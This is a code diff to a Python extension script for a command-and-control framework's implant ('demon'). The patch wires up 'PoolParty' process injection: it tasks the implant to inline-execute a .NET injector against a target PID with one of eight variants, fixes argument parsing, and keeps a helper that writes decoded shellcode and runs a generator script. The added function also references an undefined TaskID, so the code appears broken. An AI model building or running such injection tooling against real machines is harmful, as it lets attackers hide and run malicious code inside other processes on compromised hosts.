@@ -95,6 +95,14 @@ def generate(demonID, *params):
 			return TaskID
 	
 
+def execute(demon):
+	global variant
+	global pid
+	demon.ConsoleWrite( demon.CONSOLE_INFO, "Tasked demon to run PoolParty with variant %s on PID %s" % (variant,pid) )
+	query = f"-V {variant} -P {pid}"
+	
+	demon.Command(TaskID, "dotnet inline-execute %s %s" % (poolparty_file_path,query))
+
 def save_shellcode(data):
 	with open(shellcode_file_path, "wb") as file:
 		file.write(b64decode(data))
@@ -102,9 +110,16 @@ def save_shellcode(data):
 	os.system(f"python3 {cwd}/generate.py -f {shellcode_file_path} ")
 
 def run_parse_params(demon, params):
-	num_params = len(params)
+	global variant
+	global pid
 
+	num_params = len(params)
+	
 	skip = False
+
+	if num_params != 4:
+		demon.ConsoleWrite(demon.CONSOLE_ERROR,"USAGE:  poolparty run -V {1/2/3/4/5/6/7/8} -P {PID}")
+		return False
 
 	for i in range(num_params):
 		if skip:
@@ -118,23 +133,24 @@ def run_parse_params(demon, params):
 			if i+1 >= num_params:
 				demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing variant value (-v {1/2/3/4/5/6/7/8})" )
 				return False
-			variant = param[i+1]
+			variant = params[i+1]
 
 		elif param == '-P' or param == '-p':
 			skip = True
 			if i+1 >= num_params:
 				demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing PID (-P {PID})" )
 				return False
-			pid = param[i+1]
+			pid = params[i+1]
 
 		elif param == '-h' or param == "help":
 			demon.ConsoleWrite(demon.CONSOLE_INFO,"USAGE:  poolparty run -V {1/2/3/4/5/6/7/8} -P {PID}")
 			demon.ConsoleWrite(demon.CONSOLE_INFO,"\n")
-			demon.ConsoleWrite(demon.CONSOLE_INFO,"VARIANT \t\t\t\t DESCRIPTION     ")
+			demon.ConsoleWrite(demon.CONSOLE_INFO,"VARIANT   -    DESCRIPTION")
 
 		else:
-			demon.ConsoleWrite(demon.CONSOLE_INFO,"USAGE:  poolparty run -V {1/2/3/4/5/6/7/8} -P {PID}")
+			demon.ConsoleWrite(demon.CONSOLE_ERROR,"USAGE:  poolparty run -V {1/2/3/4/5/6/7/8} -P {PID}")
 
+	execute(demon)
 	return True
 
 def run(demonID, *params):
